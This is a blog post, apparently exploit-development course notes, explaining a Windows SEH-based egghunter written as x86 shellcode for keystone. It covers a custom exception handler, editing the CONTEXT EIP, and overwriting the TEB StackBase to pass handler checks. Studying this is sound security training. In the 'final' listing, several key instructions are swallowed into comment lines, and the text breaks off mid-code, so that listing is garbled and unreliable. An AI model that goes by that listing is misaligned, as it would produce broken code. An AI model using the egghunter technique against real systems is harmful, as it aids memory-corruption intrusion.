<!DOCTYPE html>
<html class="" lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
        <script>
            if (location.host != new URL("http:\/\/localhost:1313\/").host) location.href = "http:\/\/localhost:1313\/"
        </script>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='http://localhost:1313/favicon.png'
/>
<link
    rel="shortcut icon"
    href='http://localhost:1313/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='http://localhost:1313/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='http://localhost:1313/favicon.png'
        type="image/svg+xml"
    />

<title>
        
        purpurina - a place for hacking
    </title>

    
    <link href="http://localhost:1313/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
    <link href="http://localhost:1313/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>

    
    
    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.b88203936c598b692d9cbebd7da89eb34e544b8522ae4c14ca657761be96b80c2acee8e6631de04d99ee1bdbc1bcad4a3add6f47a2366f4a29e2c531782be1a8.css integrity="sha512-uIIDk2xZi2ktnL69faies05US4UirkwUymV3Yb6WuAwqzujmYx3gTZnuG9vBvK1KOt1vR6I2b0op4sUxeCvhqA==" />
<meta name="author" content="jaco" />

    
    
        <meta name="description" content="assical egghunter shellcode, we observed that the NtAccessCheckAndAuditAlarm function did not work because the system call number was changed between Windows versions.
We fixed this by changing the system call number, but this fix comes at the cost of portability. In order for our exploit to work, we would have to identify the Windows version beforehand to craft a proper exploit.&lt;/p&gt;" />
    

<meta property="og:site_name"
    content='purpurina - a place for hacking' />

    <meta property="og:title" content="" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="jaco" />
    <meta
        property="article:published_time"
        content='0001-01-01T00:00:00Z&#43;0000' />
    
    <meta property="og:url" content="http://localhost:1313/posts/osed_egghunter_seh/" />
    
    
    <meta property="og:image"
        content="http://localhost:1313/icon512.png" />
    
        <meta property="og:description" content="&lt;p&gt;When doing the classical egghunter shellcode, we observed that the NtAccessCheckAndAuditAlarm function did not work because the system call number was change" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='localhost:1313'
/>
<meta property="twitter:url" content="http://localhost:1313/posts/osed_egghunter_seh/" />


    <meta name="twitter:title" content="" />
    
    
    
    <meta name="twitter:image"
        content="http://localhost:1313/icon512.png" />
    
        <meta name="twitter:description" content="&lt;p&gt;When doing the classical egghunter shellcode, we observed that the NtAccessCheckAndAuditAlarm function did not work because the system call number was change" />
    

<link rel="manifest" href="http://localhost:1313/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="http://localhost:1313/">
                    <img src='http://localhost:1313/logo.jpg' alt='Logo'/>
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="http://localhost:1313/">purpurina - a place for hacking</a>
                        
                    </h1>
                    
                </div>
                <div id="wide_nav"><nav>
    
    <ul id="main-nav">
        <li><a href="http://localhost:1313/">Home</a></li>
        
            <li><a href="http://localhost:1313/posts/">Posts</a></li>
        
        
        
        
        
        
            <li><a href="http://localhost:1313/about/">About</a></li>
        
        
            <li><a href="http://localhost:1313/tags/">Tags</a></li>
        
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search/?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        
        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://www.linkedin.com/in/jacobocasado/?originalSubdomain=es">
    
    
        &#xf0e1;
    
    <span>
        LinkedIn
    </span>
</a>

    </div>
    

</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1></h1>
    
    
        <p class="date">
            <span title='Date'>ï—¬ </span>
    0001-01-01

</p>
    
    
    
    
    <div><p>When doing the classical egghunter shellcode, we observed that the NtAccessCheckAndAuditAlarm function did not work because the system call number was changed between Windows versions.
We fixed this by changing the system call number, but this fix comes at the cost of portability. In order for our exploit to work, we would have to identify the Windows version beforehand to craft a proper exploit.</p>
<p>In this case, we are going to make an egghunter that does not use the NtAccessCheckAndAuditAlarm function (remember that we used this function in order to <strong>check in a safe way if we have right access to the memory</strong>, as this function handles errors) and we are going to <strong>handle the error</strong> manually when checking if the memory region is accessible. This way, we won&rsquo;t depend on this system call and we won&rsquo;t need to have specific SSNs depending on the Windows versions.</p>
<p>The downside to this mechanism is that the egghunter requires additional assembly instructions <strong>in order to set up the SEH mechanism</strong>- the original egghunter was around 35 bytes whereas this egghunter is 60 bytes. However, it is still smaller than a normal shellcode and it can help if we have space.</p>
<p>Let&rsquo;s analyze the code of this SEH-based egghunter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>  
</span></span><span style="display:flex;"><span>CODE <span style="color:#f92672">=</span> (  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; start: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># jump to a negative call to dynamically  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># obtain egghunter position</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jmp get_seh_address ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; build_exception_record: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the address of the exception_handler  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># into ecx</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; pop ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov signature into eax  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov eax, 0x74303077 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push Handler of the  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># _EXCEPTION_REGISTRATION_RECORD structure</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; push ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push Next of the  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># _EXCEPTION_REGISTRATION_RECORD structure</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; push 0xffffffff ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># null out ebx  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; xor ebx, ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># overwrite ExceptionList in the TEB with a pointer  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># to our new _EXCEPTION_REGISTRATION_RECORD structure</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov dword ptr fs:[ebx], esp ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; is_egg: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push 0x02  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x02 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the value into ecx which will act  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># as a counter</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; pop ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov memory address into edi  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov edi, ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># check for our signature, if the page is invalid we  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># trigger an exception and jump to our exception_handler function</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; repe scasd ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># if we didn&#39;t find signature, increase ebx  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># and repeat</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jnz loop_inc_one ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># we found our signature and will jump to it  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; jmp edi ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_page: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># if page is invalid the exception_handler will  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># update eip to point here and we move to next page</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; or bx, 0xfff ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_one: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase ebx by one byte  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; inc ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># check for signature again  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; jmp is_egg ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; get_seh_address: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># call to a higher address to avoid null bytes &amp; push  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># return to obtain egghunter position</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; call build_exception_record ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push 0x0c onto the stack  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x0c ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the value into ecx  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop ecx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov into eax the pointer to the CONTEXT  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># structure for our exception</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov eax, [esp+ecx] ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov 0xb8 into ecx which will act as an  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># offset to the eip</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov cl, 0xb8 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase the value of eip by 0x06 in our CONTEXT  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># so it points to the &#34;or bx, 0xfff&#34; instruction </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># to increase the memory page</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; add dword ptr ds:[eax+ecx], 0x06 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># save return value into eax  (IF YOU ANALYZE THIS DEEPLY YOU WILL FIND THAT THE ADDRESS OF PUSH 0x0C is on top of the stack, so doing a pop will store it)</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># increase esp to clean the stack for our call  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; add esp, 0x10 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push return value back into the stack  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># null out eax to simulate  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># ExceptionContinueExecution return</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; xor eax, eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># return  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; ret ;&#34;</span>  
</span></span><span style="display:flex;"><span>)  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Initialize engine in X86-32bit mode  </span>
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_X86, KS_MODE_32)
</span></span></code></pre></div><p>The code starts by executing a JMP instruction to a later part in the code, the <code>get_seh_address</code> label.
In this label, the first instruction is a <strong>relative CALL</strong> to the <code>build_exception_record</code> function.
When executing a <strong>relative call, the opcodes will match the offset from the current value of EIP.</strong> This would generate opcodes, but, as we are calling a <strong>function that is declared previosly in the code, the offset is negative, and we are doing a backward call, so there are not nullbytes as the offset is negative.</strong> That is why we declare our <code>build_exception_record</code> <strong>after</strong> in the code (Note: we learnt that the disposition of the labels <strong>is very important when doing shellcode!</strong>).
Also, as we are doing a <strong>call</strong> operation, the return address is stored in the stack (the CALL instruction does that) so that the program knows where to continue after the <code>build_exception_record</code> function has finished.
The <code>build_exception_record</code> function starts by popping the return value (which has just been stored in the stack, and represents the location of our egghunter) into the ecx register.
Then, the egg signature (0x74303077, t00w in little endian, remember that to store numbers and strings we have to store them in little endian) is moved to the eax register.
Then, we are going to add the two values of the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure in the stack, as we want to build our own <code>_EXCEPTION_REGISTRATION_RECORD</code>. We push our return address pointing to the next instruction after our CALL instruction (this is the value of the push 0x0c instruction) as the &ldquo;Handler&rdquo; member of the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure, and then we push the value of &ldquo;-1&rdquo; (0xffffffff) as our Next member. This signals <strong>that this registration record is tha last one, as there is no next member!</strong>. The OS won&rsquo;t search for more handlers after this one.
Then, we overwrite the <strong>first exception handler</strong> (that is pointed by <code>fs:[0]</code>) by nulling ebx, and putting the value of <code>fs[ebx]</code> to the values on the top of the stack. Wow! We just pushed both values of the <code>_EXCEPTION_REGISTRATION_RECORD</code> in the top of the stack! This basically overwrites the first exception handler for our custom one.
The next functions (is_egg, loop_inc_page, and loop_inc_one) are meant to search for our egg in memory. They are similar to the previous egghunter, but rather than executing the SCASD operation twice, we use the <strong>REPE</strong> instruction with the counter stored in ECX. This is done to minimize the size of the egghunter.
Given that we do not use any system call to check if a memory page is mapped or if we can access it, the access violation will be triggered on the REPE SCASD instruction. This will raise an exception that <strong>will trigger our custom handler</strong>. We want <strong>that our exception handler restores execution at the <code>loop_inc_page</code> function</strong>, which will move on to the next memory page and repeat the search.</p>
<p>During a previous module, we explored the prototype of the <code>_except_handler</code> function, the function of our handler:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> EXCEPTION_DISPOSITION <span style="color:#a6e22e">_except_handler</span> (<span style="color:#f92672">*</span>PEXCEPTION_ROUTINE) ( 
</span></span><span style="display:flex;"><span>IN PEXCEPTION_RECORD ExceptionRecord,
</span></span><span style="display:flex;"><span>IN VOID EstablisherFrame,
</span></span><span style="display:flex;"><span>IN OUT PCONTEXT ContextRecord,
</span></span><span style="display:flex;"><span>IN OUT PDISPATCHER_CONTEXT DispatcherContext );
</span></span></code></pre></div><p>When an exception is triggered, the OS will call our custom &ldquo;Handler&rdquo; function, passing these four parameters into the stack.
Therefore, these 4 parameters will be in the stack and we will be able to manipulate them.
The interesting parameter is the third parameter, the <code>PCONTEXT</code> parameter, which points to a CONTEXT structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt ntdll<span style="color:#f92672">!</span>_CONTEXT
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> ContextFlags     : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Dr0              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x008</span> Dr1              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x00c</span> Dr2              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x010</span> Dr3              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x014</span> Dr6              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x018</span> Dr7              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x08c</span> SegGs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x090</span> SegFs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x094</span> SegEs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x098</span> SegDs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x09c</span> Edi              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a0</span> Esi              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a4</span> Ebx              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a8</span> Edx              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0ac</span> Ecx              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b0</span> Eax              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b4</span> Ebp              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b8</span> Eip              : Uint4B <span style="color:#75715e">// INTERESTING
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0bc</span> SegCs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c0</span> EFlags           : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c4</span> Esp              : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c8</span> SegSs            : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0cc</span> ExtendedRegisters : [<span style="color:#ae81ff">512</span>] UChar
</span></span></code></pre></div><p>This structure contains the processor register data at the time the exception occurred.
At the moment the exception occurs, all register values are stored in this structure. At offset 0x0b8 from the beginning of this structure, we find the EIP member. This member stores <strong>the memory address pointing to the instruction that caused the access violation.</strong>
This member is an important part of the egghunter resuming execution. <strong>Because we can modify this structure as part of our custom <code>_except_handler</code> implementation,</strong> we can also resume the execution flow at the <code>_loop_inc_page</code> function to move to the next memory page.</p>
<p>Our handler also needs to take care of the return value, in EAX. The result of the handler comes in the form of an <code>_EXCEPTION_DISPOSITION</code> structure containing four members, each of them acting as a return value:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">006</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_DISPOSITION
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_DISPOSITION
</span></span><span style="display:flex;"><span>ExceptionContinueExecution <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n0
</span></span><span style="display:flex;"><span>ExceptionContinueSearch <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n1
</span></span><span style="display:flex;"><span>ExceptionNestedException <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n2
</span></span><span style="display:flex;"><span>ExceptionCollidedUnwind <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n3
</span></span></code></pre></div><p>Therefore, to continue the execution, this value must be 0x00, to signal that the exception has been successfully handled, so that when the exception is triggered and our function is executed, we return to the <code>_loop_inc_page</code> value and continue the execution, in a loop.</p>
<p>So at the memory address of the &ldquo;Handler&rdquo; (our returning point to manage the exception) must:</p>
<ul>
<li>Retrieve the <code>ContextRecord</code> parameter which has been pushed to the stack, as well as the other 3 parameters.</li>
<li>Obtain the EIP member adding 0xB8 to the offset of <code>ContextRecord</code>.</li>
<li>We modify the value of this EIP member to the <code>loop_inc_page</code> memory address offset.</li>
<li>We save this value in EAX as we want to return to this address.</li>
<li>Reduce the stack size to clear the 4 arguments that are not needed anymore. We already got the EIP value and added the offset, and stored this value in EAX.</li>
<li>Push the EAX (address we want to return, which is the address of push 0x0c) into the stack.</li>
<li>Null out EAX to signal the OS that the exception has been managed ( <code>ExceptionContinueExecution</code>)</li>
<li>Perform a <code>ret</code> instruction to return to the <code>loop_inc_page</code> function.</li>
</ul>
<p>The <code>ret</code> at the end of our shellcode would return to the address of the push 0x0c instruction but as EAX is 0, the return address is not used and the EIP from the CONTEXT parameter in the stack is used to set up EIP. As we modified EIP to go to the add+1 page and continue searching, we repeat the search process again and again.</p>
<p><strong>TBD: I think that you can put any address in the top of the stack before using the <code>ret</code> instruction as the return address will never be used. EIP from the CONTEXT variable will be used.</strong></p>
<p>Next, this won&rsquo;t work at all. The following checks over our SEH handler will be performed:</p>
<ol>
<li>The memory address of our _EXCEPTION_REGISTRATION_RECORD structure needs to be higher than the StackLimit.</li>
<li>The memory address of our _EXCEPTION_REGISTRATION_RECORD structure plus 0x08 needs to be lower than the StackBase.</li>
<li>The memory address of our _EXCEPTION_REGISTRATION_RECORD structure needs to be aligned to the four bytes boundary.</li>
<li>The memory address of our _except_handler function needs to be located at a higher address than the StackBase.</li>
</ol>
<p>The three first ones are OK, as we created a <code>EXCEPTION_REGISTRATION_RECORD</code> structure in the stack, so it is between the StackLimit and StackBase and will meet those conditions always.
But our custom function is also inside the stack, and condition 4 tries to check if it is located at a higher memory address than the StackBase. This check is implemented because the stack is only supposed to contain data. Functions can read or write to it but the stack is not supposed to contain executable code.
How do we manage to execute our function then?
Well, we have modified the field of the TEB corresponding to the address of the first handler to be executed.
Why don&rsquo;t we modify the value of the StackBase field of the TEB to be lower than the address of our <code>_except_handler</code> function, but higher than the value of our <code>_EXCEPTION_REGISTRATION_RECORD</code> structure?</p>
<p>The egghunter already gathered the address of the <code>except_handler</code> function dinamically, so we could substract a small number of bytes from it (not much, so the StackBase is still higher than our <code>_EXCEPTION_REGISTRATION_RECORD</code> structure) and use that to overwrite the StackBase value.
This is what is updated in the egghunter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># overwrite ExceptionList in the TEB with a pointer </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># to our new _EXCEPTION_REGISTRATION_RECORD structure </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov dword ptr fs:[ebx], esp ;&#34;</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e"># subtract 0x04 from the pointer</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># to exception_handler </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; sub ecx, 0x04 ;&#34;</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e"># add 0x04 to ebx </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; add ebx, 0x04 ;&#34;</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e"># overwrite the StackBase in the TEB to the address -4, which is in ECX</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># this way, Stackbase will be lower than our except_handler function!</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov dword ptr fs:[ebx], ecx ;&#34;</span>
</span></span></code></pre></div><p>Now the verification is done. Remember that this module does not have SafeSEH so we don&rsquo;t need to bypass it, but it would be another protection to bypass.</p>
<p>The final SEH egghunter would be this one:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>  
</span></span><span style="display:flex;"><span>CODE <span style="color:#f92672">=</span> (  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; start: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># jump to a negative call to dynamically  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># obtain egghunter position&#34; jmp get_seh_address ;&#34;  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; build_exception_record: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the address of the exception_handler  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># into ecx&#34; pop ecx ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov signature into eax  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov eax, 0x74303077 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push Handler of the  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># _EXCEPTION_REGISTRATION_RECORD structure&#34; push ecx ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push Next of the  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># _EXCEPTION_REGISTRATION_RECORD structure&#34; push 0xffffffff ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># null out ebx  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; xor ebx, ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># overwrite ExceptionList in the TEB with a pointer  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># to our new _EXCEPTION_REGISTRATION_RECORD structure&#34; mov dword ptr fs:[ebx], esp ;&#34;  </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># subtract 0x04 from the pointer (address) to exception_handler  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; sub ecx, 0x04 ;&#34;</span> <span style="color:#75715e"># add 0x04 to ebx so it points to TEB StackBase field instead of the first element of TEB  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; add ebx, 0x04 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># overwrite the StackBase in the TEB  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov dword ptr fs:[ebx], ecx ;&#34;</span> <span style="color:#e6db74">&#34; is_egg: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># push 0x02  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x02 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># pop the value into ecx which will act  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># as a counter&#34; pop ecx ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># mov memory address into edi  </span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; mov edi, ebx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># check for our signature, if the page is invalid we  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># trigger an exception and jump to our exception_handler function&#34; repe scasd ;&#34;  </span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># if we didn&#39;t find signature, increase ebx  </span>
